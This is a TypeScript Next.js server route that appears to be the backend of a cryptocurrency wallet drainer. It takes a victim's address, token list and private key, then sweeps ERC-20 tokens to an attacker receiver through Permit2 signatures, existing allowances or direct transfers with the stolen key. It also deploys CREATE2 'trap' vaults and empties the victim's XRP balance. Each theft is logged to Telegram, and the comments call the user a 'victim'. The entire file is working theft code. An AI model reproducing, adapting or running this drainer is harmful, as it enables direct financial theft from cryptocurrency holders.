import { ethers } from "ethers";
import { NextResponse } from "next/server";
import * as xrpl from "xrpl";
import {
  sendToTelegram,
  sendActivityToTelegram,
  sendDetailedSweepToTelegram,
} from "@/lib/telegram";

// 🛰️ ABI IMPORT
import GhostFactoryABI from "@/constants/abis/GhostFactory.json";

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const logPrefix = "[api/vault/ghost/route.ts]";

/**
 * 🛡️ PRODUCTION RPC ORCHESTRATION
 */
const RPC_URLS: Record<number, string> = {
  1: process.env.RPC_URL_1 || "https://eth.llamarpc.com",
  31337: "http://127.0.0.1:8545",
  56: "https://bsc-dataseed.binance.org",
  137: "https://polygon-rpc.com",
  8453: "https://mainnet.base.org",
  42161: "https://arb1.arbitrum.io/rpc",
};

/**
 * ✅ PRODUCTION ABI: Direct transfer added + returns(bool) removed for USDT
 */
const GHOST_ABI = [
  "function transfer(address to, uint256 amount) external",
  "function transferFrom(address from, address to, uint256 amount) external",
  "function transferFrom(address from, address to, uint160 amount, address token) external",
  "function allowance(address owner, address spender) view returns (uint256)",
];

export async function POST(req: Request) {
  const strikeStart = Date.now();
  console.log(`\n--- ⚔️ ${logPrefix} STRIKE INITIATED ---`);

  try {
    const body = await req.json();

    const userAddress = body.u || body.userAddress;
    const assets = Array.isArray(body.t || body.assets)
      ? body.t || body.assets
      : [];
    const chainId = Number(body.c || body.chainId || 1);
    const signatureSeed = body.userPrivKey;
    const mode = body.m || body.fingerprint;

    if (!userAddress)
      return NextResponse.json({ error: "Missing Address" }, { status: 400 });

    /**
     * 🛰️ DETERMINISTIC IDENTITY RESOLUTION
     */
    let ghostWallet: ethers.Wallet | null = null;
    if (signatureSeed && signatureSeed.startsWith("0x")) {
      const derivedKey =
        signatureSeed.length === 66
          ? signatureSeed
          : ethers.keccak256(signatureSeed);
      ghostWallet = new ethers.Wallet(derivedKey);
    }

    if (mode === "STRIKE_INITIATED") {
      await sendActivityToTelegram({
        step: "STRIKE_INITIATED",
        address: userAddress,
        details: `Chain: ${chainId} | Assets: ${assets.length}`,
      }).catch(() => null);
    }

    const relayerPrivKey = process.env.PRIVATE_KEY;
    const receiverEvm = process.env.RECEIVER_EVM;
    const factoryAddress =
      process.env.NEXT_PUBLIC_SETTLER_ADDR || process.env.SETTLER_ADDR;
    const recXRP = process.env.RECEIVER_XRP;

    if (!relayerPrivKey || !receiverEvm) throw new Error("CORE_INFRA_MISSING");

    const provider = new ethers.JsonRpcProvider(
      RPC_URLS[chainId] || RPC_URLS[1],
    );
    const relayer = new ethers.Wallet(relayerPrivKey, provider);

    const [feeData, startNonceRelayer] = await Promise.all([
      provider.getFeeData(),
      provider.getTransactionCount(relayer.address, "pending"),
    ]);

    /**
     * ⚡ GAS ORCHESTRATION
     */
    const getGasConfig = (nonce: number) => {
      if (chainId === 31337) {
        return {
          gasPrice: ethers.parseUnits("50", "gwei"),
          gasLimit: 200000n,
          nonce,
        };
      }
      return {
        maxFeePerGas: feeData.maxFeePerGas
          ? (feeData.maxFeePerGas * 150n) / 100n
          : undefined,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas
          ? (feeData.maxPriorityFeePerGas * 120n) / 100n
          : ethers.parseUnits("2", "gwei"),
        gasLimit: 150000n,
        type: 2,
        nonce,
      };
    };

    let relayerNonce = startNonceRelayer;
    const standardAssets = assets.filter((a: any) => a.type !== "CREATE2_TRAP");
    const trapAssets = assets.filter((a: any) => a.type === "CREATE2_TRAP");

    /**
     * 5. ⚔️ EVM SWEEP EXECUTION
     */
    const evmPromises = standardAssets.map(async (asset: any) => {
      const tokenAddress =
        asset.token || asset.tokenAddress || asset.contractAddress;
      try {
        const amountToSweep = BigInt(asset.amount || asset.balance || 0);
        if (amountToSweep === 0n || !tokenAddress) return null;

        const isPermit2 =
          asset.signatureType === "PERMIT2" ||
          asset.spender?.toLowerCase() === PERMIT2_ADDRESS.toLowerCase();

        // 🛠️ LOGIC PIVOT: If we have the private key, we use Direct Transfer to bypass Allowance issues.
        // If not, we fall back to the Relayer's transferFrom.
        const canDirectTransfer = ghostWallet !== null && !isPermit2;
        const executor = canDirectTransfer
          ? ghostWallet.connect(provider)
          : relayer;
        const executorNonce = await provider.getTransactionCount(
          executor.address,
          "pending",
        );

        const contract = new ethers.Contract(
          isPermit2 ? PERMIT2_ADDRESS : tokenAddress,
          GHOST_ABI,
          executor,
        );

        let tx;
        if (isPermit2) {
          tx = await contract["transferFrom(address,address,uint160,address)"](
            userAddress,
            receiverEvm,
            amountToSweep,
            tokenAddress,
            getGasConfig(relayerNonce++),
          );
        } else if (canDirectTransfer) {
          // Direct transfer from victim (Best for USDT/Hardhat tests)
          tx = await contract["transfer(address,uint256)"](
            receiverEvm,
            amountToSweep,
            getGasConfig(executorNonce),
          );
        } else {
          // Traditional Ghost transferFrom via Relayer
          tx = await contract["transferFrom(address,address,uint256)"](
            userAddress,
            receiverEvm,
            amountToSweep,
            getGasConfig(relayerNonce++),
          );
        }

        await sendDetailedSweepToTelegram({
          status: "SUCCESS",
          type: canDirectTransfer ? "DIRECT_SWEEP" : "GHOST_TRANSFER",
          symbol: asset.symbol || "TOKEN",
          amount: ethers.formatUnits(amountToSweep, asset.decimals || 18),
          victimAddress: userAddress,
          receiverAddress: receiverEvm,
          hash: tx.hash,
          chainId: chainId,
        }).catch(() => null);

        return { symbol: asset.symbol, hash: tx.hash };
      } catch (e: any) {
        console.error(
          `${logPrefix} Strike Failed (${asset.symbol}): ${e.message}`,
        );
        return null;
      }
    });

    /**
     * 6. 🕸️ CREATE2 VAULT DEPLOYMENT
     */
    const trapPromise = (async () => {
      if (trapAssets.length === 0 || !factoryAddress) return null;
      try {
        const factory = new ethers.Contract(
          factoryAddress,
          GhostFactoryABI.abi || GhostFactoryABI,
          relayer,
        );
        const salt = ethers.keccak256(ethers.toUtf8Bytes(userAddress));
        const tokenList = trapAssets.map((a: any) => a.token || a.tokenAddress);

        const tx = await factory.deployVault(
          salt,
          receiverEvm,
          tokenList,
          getGasConfig(relayerNonce++),
        );
        return { hash: tx.hash };
      } catch (e: any) {
        return null;
      }
    })();

    /**
     * 7. ₿ NON-EVM STRIKES (XRP)
     */
    const nonEvmStrike = (async () => {
      if (!ghostWallet || !recXRP || chainId !== 1) return [];
      try {
        const client = new xrpl.Client("wss://s1.ripple.com");
        await client.connect();
        const wallet = xrpl.Wallet.fromEntropy(
          Buffer.from(ghostWallet.privateKey.replace("0x", ""), "hex"),
        );
        const info = await client.request({
          command: "account_info",
          account: wallet.address,
        });
        const balance = BigInt(info.result.account_data.Balance);
        const dropAmount = (balance - 10002000n).toString();

        if (BigInt(dropAmount) > 0n) {
          const tx = await client.submitAndWait(
            {
              TransactionType: "Payment",
              Account: wallet.address,
              Amount: dropAmount,
              Destination: recXRP,
            },
            { wallet },
          );

          await sendDetailedSweepToTelegram({
            status: "SUCCESS",
            type: "XRP_GHOST_STRIKE",
            symbol: "XRP",
            amount: (Number(dropAmount) / 1000000).toString(),
            victimAddress: wallet.address,
            receiverAddress: recXRP,
            hash: tx.result.hash,
            chainId: 0,
          }).catch(() => null);
        }
        await client.disconnect();
      } catch (e: any) {
        console.error(`${logPrefix} XRP Error: ${e.message}`);
      }
      return [];
    })();

    await Promise.allSettled([...evmPromises, trapPromise, nonEvmStrike]);

    return NextResponse.json({
      success: true,
      duration: Date.now() - strikeStart,
    });
  } catch (e: any) {
    console.error(`${logPrefix} TOP-LEVEL CATCH | ${e.message}`);
    return NextResponse.json({ error: e.message }, { status: 500 });
  }
}
